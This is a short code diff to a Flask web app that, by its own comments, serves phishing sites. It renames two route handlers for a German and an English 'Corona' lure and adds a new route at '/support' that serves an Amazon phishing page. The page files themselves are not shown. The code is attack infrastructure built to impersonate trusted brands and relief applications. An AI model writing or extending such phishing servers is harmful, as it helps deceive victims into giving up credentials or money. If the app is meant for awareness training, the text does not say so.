@@ -6,15 +6,19 @@ app._static_folder = ""
 
 # Corona phishing site
 
-# @TODO use relative paths
-
 @app.route('/neuerAntrag')
-def corona():
+def corona_ger():
     return send_file(r'html\ger\corona.html')
 
 @app.route('/register')
-def corona():
+def corona_eng():
     return send_file(r'html\eng\corona.html')
+
+# Amazon phishing site
+
+@app.route('/support')
+def amazon_eng():
+    return send_file(r'html\eng\amazon.html')
 
 # Bitcoin phishing site
 
